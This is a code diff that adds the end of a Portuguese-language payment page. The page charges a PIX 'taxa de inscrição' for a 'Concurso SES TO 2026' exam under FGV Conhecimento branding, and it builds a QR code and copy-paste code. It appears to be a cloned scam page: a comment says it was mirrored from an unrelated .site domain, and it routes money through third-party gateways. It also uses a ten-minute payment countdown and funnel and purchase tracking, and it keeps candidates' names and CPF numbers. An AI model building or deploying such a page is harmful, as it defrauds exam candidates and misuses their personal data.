+          <img src="logo-fgv-conhecimento.svg" alt="FGV Conhecimento" class="mx-auto" style="max-width: 200px; height: auto;" />
+        </div>
+        <h3 class="text-xl font-bold text-gray-900">${isCached ? "Cobrança disponível" : "Taxa de inscrição"}</h3>
+        <p class="text-sm text-gray-600 mt-2">Concurso SES TO 2026 — ${amountLabel}</p>
+        ${paymentId ? `<p class="text-[10px] text-gray-400 mt-1">Protocolo: ${paymentId}</p>` : ""}
+      </div>
+
+      ${cacheAlert}
+
+      <div class="bg-yellow-50 border border-yellow-200 rounded-lg p-3 mb-4">
+        <div class="flex items-start">
+          <i class="fas fa-clock text-yellow-600 mr-2 mt-1"></i>
+          <div class="text-sm text-yellow-800">
+            <p class="font-medium">Prazo para pagamento: 10 minutos</p>
+            <p>Após a quitação, a inscrição é confirmada automaticamente nesta tela.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="text-center mb-4">
+        <div class="inline-block p-3 border rounded-lg">
+          <div id="qrcode-canvas" class="w-[200px] h-[200px]"></div>
+        </div>
+        <p class="text-xs text-gray-500 mt-2">Leia o QR Code no aplicativo do seu banco</p>
+      </div>
+
+      <div class="bg-gray-50 rounded-lg p-4 mb-4 text-center">
+        <div class="text-lg font-bold text-gray-800 mb-1">${amountLabel}</div>
+      </div>
+
+      <div class="mb-4">
+        <label class="block text-sm font-medium text-gray-700 mb-2">Código de pagamento (copia e cola)</label>
+        <div class="flex">
+          <input
+            type="text"
+            value="${pixCode.replace(/"/g, '&quot;')}"
+            readonly
+            id="pix-code-input"
+            class="flex-1 px-3 py-2 border border-gray-300 rounded-l-lg bg-gray-50 text-xs font-mono"
+          />
+          <button
+            id="copy-pix-btn"
+            class="px-4 py-2 bg-blue-600 text-white rounded-r-lg hover:bg-blue-700 transition-colors font-semibold"
+          >
+            Copiar código
+          </button>
+        </div>
+        <p class="text-xs text-gray-500 mt-2">Pagamento instantâneo via transferência PIX no aplicativo bancário.</p>
+      </div>
+
+      <div class="text-xs text-gray-500 text-center mb-4">
+        <p>1. Abra o aplicativo do seu banco</p>
+        <p>2. Escolha pagamento por QR Code ou código copia e cola</p>
+        <p>3. Confirme o pagamento da taxa de inscrição</p>
+      </div>
+
+      <div class="flex space-x-2 sm:space-x-3 sticky bottom-0 bg-white pt-2 pb-1">
+        <button onclick="closePixModal()" class="flex-1 bg-gray-200 text-gray-700 px-3 sm:px-4 py-2 rounded-lg hover:bg-gray-300 transition-colors text-sm sm:text-base">
+          Fechar
+        </button>
+      </div>
+    </div>
+  `;
+
+                            // Monta modal e exibe
+                            paymentModal.innerHTML = modalHtml;
+                            paymentModal.classList.remove("hidden");
+
+                            // Liga botão copiar
+                            const copyBtn = document.getElementById("copy-pix-btn");
+                            if (copyBtn) copyBtn.onclick = () => copyPixCode(pixCode);
+
+                            // Carrega lib e gera QR
+                            try {
+                                await loadQRCodeLib();
+                                const el = document.getElementById("qrcode-canvas");
+                                if (el && window.QRCode) {
+                                    // Gera QR 200x200 no container
+                                    // Corrige level para leitura confiável sem exagero de redundância
+                                    new window.QRCode(el, {
+                                        text: pixCode,
+                                        width: 200,
+                                        height: 200,
+                                        correctLevel: window.QRCode.CorrectLevel.M,
+                                    });
+                                }
+                            } catch (e) {
+                                console.error('❌ Erro na geração principal do QR Code:', e);
+                                
+                                // ✅ FALLBACK: Tentar gerar QR Code manualmente
+                                console.log('🔄 Tentando fallback manual...');
+                                
+                                try {
+                                    const manualQR = await generateManualQRCode(pixCode);
+                                    
+                                const cont = document.getElementById("qrcode-canvas");
+                                if (cont) {
+                                        if (manualQR) {
+                                            // ✅ Sucesso no fallback manual
+                                            if (manualQR.startsWith('data:image/')) {
+                                                // Data URL (canvas)
+                                                cont.innerHTML = `<img src="${manualQR}" alt="QR Code PIX" style="width: 200px; height: 200px; border: 1px solid #ddd; border-radius: 8px;">`;
+                                            } else {
+                                                // URL da API
+                                                cont.innerHTML = `<img src="${manualQR}" alt="QR Code PIX" style="width: 200px; height: 200px; border: 1px solid #ddd; border-radius: 8px;" onerror="this.parentElement.innerHTML='<div class=\'text-xs text-red-600 p-4 text-center\'>Erro ao carregar QR Code. Use o código Copia e Cola.</div>'">`;
+                                            }
+                                            console.log('✅ QR Code gerado via fallback manual');
+                                        } else {
+                                            // ❌ Falha total - mostrar mensagem
+                                            cont.innerHTML = `<div class="text-xs text-red-600 p-4 text-center">Não foi possível gerar o QR Code. Use o código "Copia e Cola" abaixo.</div>`;
+                                            console.log('❌ Fallback manual também falhou');
+                                        }
+                                    }
+                                } catch (fallbackError) {
+                                    console.error('❌ Erro no fallback:', fallbackError);
+                                    const cont = document.getElementById("qrcode-canvas");
+                                    if (cont) {
+                                        cont.innerHTML = `<div class="text-xs text-red-600 p-4 text-center">Erro no sistema de fallback. Use o código "Copia e Cola" abaixo.</div>`;
+                                    }
+                                }
+                            }
+
+                            // Persiste no localStorage (somente o essencial)
+                            try {
+                                localStorage.setItem(
+                                    "currentPix",
+                                    JSON.stringify({
+                                        id: paymentId || transactionHash || null,
+                                        payment_code: paymentId || transactionHash || null,
+                                        pix: pixCode,
+                                        user: { nome: userData?.NOME || null, cpf: userData?.CPF || null },
+                                        createdAt: new Date().toISOString(),
+                                        cached: isCached,
+                                    })
+                                );
+                            } catch { }
+                        }
+
+
+                        async function copyPixCode() {
+                            const input = document.getElementById("pix-code-input");
+                            const pixCode = input.value;
+                            const button = event.target;
+                            const originalText = button.innerHTML;
+
+                            try {
+                                // Método moderno usando Clipboard API
+                                if (navigator.clipboard && window.isSecureContext) {
+                                    await navigator.clipboard.writeText(pixCode);
+                                } else {
+                                    // Fallback para navegadores mais antigos
+                                    input.focus();
+                                    input.select();
+                                    input.setSelectionRange(0, 99999); // Para mobile
+
+                                    // Criar textarea temporária para iOS
+                                    const textArea = document.createElement("textarea");
+                                    textArea.value = pixCode;
+                                    textArea.style.position = "fixed";
+                                    textArea.style.top = "0";
+                                    textArea.style.left = "0";
+                                    textArea.style.width = "2em";
+                                    textArea.style.height = "2em";
+                                    textArea.style.padding = "0";
+                                    textArea.style.border = "none";
+                                    textArea.style.outline = "none";
+                                    textArea.style.boxShadow = "none";
+                                    textArea.style.background = "transparent";
+                                    document.body.appendChild(textArea);
+                                    textArea.focus();
+                                    textArea.select();
+
+                                    const successful = document.execCommand('copy');
+                                    document.body.removeChild(textArea);
+
+                                    if (!successful) {
+                                        throw new Error("Falha ao copiar");
+                                    }
+                                }
+
+                                // Feedback visual de sucesso
+                                button.innerHTML = "✅ Copiado!";
+                                button.classList.add("bg-green-600");
+                                button.classList.remove("bg-blue-600");
+
+                                setTimeout(() => {
+                                    button.innerHTML = originalText;
+                                    button.classList.remove("bg-green-600");
+                                    button.classList.add("bg-blue-600");
+                                }, 2000);
+
+                            } catch (err) {
+                                console.error("Erro ao copiar:", err);
+                                // Feedback visual de erro
+                                button.innerHTML = "❌ Erro ao copiar";
+                                button.classList.add("bg-red-600");
+                                button.classList.remove("bg-blue-600");
+
+                                // Mostrar mensagem alternativa
+                                alert("Não foi possível copiar automaticamente. Por favor, selecione o código e copie manualmente (Ctrl+C ou Cmd+C).");
+
+                                // Selecionar o texto para facilitar cópia manual
+                                input.focus();
+                                input.select();
+
+                                setTimeout(() => {
+                                    button.innerHTML = originalText;
+                                    button.classList.remove("bg-red-600");
+                                    button.classList.add("bg-blue-600");
+                                }, 3000);
+                            }
+                        }
+
+                        function toggleQRCode() {
+                            const container =
+                                document.getElementById(
+                                    "qr-code-container",
+                                );
+                            const button =
+                                document.getElementById("qr-toggle-btn");
+
+                            if (container.classList.contains("hidden")) {
+                                container.classList.remove("hidden");
+                                button.innerHTML = "❌ Ocultar QR Code";
+                            } else {
+                                container.classList.add("hidden");
+                                button.innerHTML = "📱 Exibir QR Code";
+                            }
+                        }
+
+                        function closePixModal() {
+                            const paymentModal =
+                                document.getElementById("payment-modal");
+                            paymentModal.classList.add("hidden");
+
+                            // Restaurar modal original
+                            location.reload();
+                        }
+
+                        async function checkPaymentStatus(paymentCode) {
+                            const button = event.target;
+                            const originalText = button.innerHTML;
+
+                            button.innerHTML =
+                                '<div class="flex items-center justify-center"><div class="animate-spin mr-2 h-4 w-4 border-2 border-white border-t-transparent rounded-full"></div> Verificando...</div>';
+                            button.disabled = true;
+
+                            try {
+                                // MedusaPay - verificar status da transação
+                                const medusapay = new MedusapayPayment();
+                                const statusResult = await medusapay.checkTransactionStatus(paymentCode);
+
+                                if (statusResult.success && statusResult.isPaid) {
+                                    medusapay.sendTrackingEvents('Purchase', paymentCode);
+
+                                    try {
+                                        var tx = JSON.parse(localStorage.getItem('medusapayTransaction') || '{}');
+                                        var amountCents = Number(localStorage.getItem('taxaCobradaCents') || tx.amount || 0);
+                                        if (!amountCents) {
+                                            var taxa = Number(localStorage.getItem('taxaValor') || 0);
+                                            amountCents = (taxa === 100 || taxa === 150) ? taxa * 100 : 15000;
+                                        }
+                                        localStorage.setItem('pagamentoConfirmado', JSON.stringify({
+                                            transactionId: paymentCode,
+                                            amount: amountCents,
+                                            valorReais: amountCents / 100,
+                                            status: 'paid',
+                                            confirmedAt: new Date().toISOString()
+                                        }));
+                                        localStorage.removeItem("currentPix");
+                                        localStorage.removeItem("medusapayTransaction");
+                                    } catch {}
+
+                                    try { if (window.FunnelTracker) FunnelTracker.advance('pagamento'); } catch (e) {}
+                                    redirectWithUtmParams("/confirmacao/");
+                                } else {
+                                    const statusText = statusResult.status || 'pendente';
+                                    alert('Pagamento ainda não confirmado. Status: ' + statusText + '. Aguarde alguns minutos e tente novamente.');
+                                }
+                            } catch (error) {
+                                console.error("Erro ao verificar pagamento:", error);
+                                alert("Erro ao verificar pagamento. Tente novamente.");
+                            }
+
+                            button.innerHTML = originalText;
+                            button.disabled = false;
+                        }
+                    </script>
+                </div>
+            </div>
+        </div>
+    </main>
+    <footer class="fgv-footer">
+  <img src="logo-fgv-conhecimento.svg" alt="FGV Conhecimento">
+  <div>FGV Conhecimento</div>
+</footer>
+    
+    <!-- Blackcat Payment Gateway -->
+    <script src="js/blackcat-payment.js"></script>
+    
+    <!-- Sistema de Verificação Automática de Pagamento -->
+    <script src="js/auto-payment-check.js"></script>
+    
+    <!-- ✅ Biblioteca QRCode.js para fallback manual -->
+    <script src="js/qrcode.min.js"></script>
+    <!-- ✅ Biblioteca alternativa para fallback -->
+    <script src="js/qrcode.min_1.js"></script>
+
+
+
+
+<script>document.addEventListener('DOMContentLoaded',function(){if(typeof window.resolveTaxaSesTo==='function'){var v=window.resolveTaxaSesTo();var els=document.querySelectorAll('#taxa-display,[data-taxa]');for(var i=0;i<els.length;i++){els[i].textContent='R$ '+v.toFixed(2).replace('.',',');}}});</script>
+<script src="/js/funnel-tracker.js" data-funnel-step="pagamento"></script>
+</body><!-- Mirrored from concursopm.site/inicio/CNU-info/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 11 Sep 2025 02:22:23 GMT --></html>
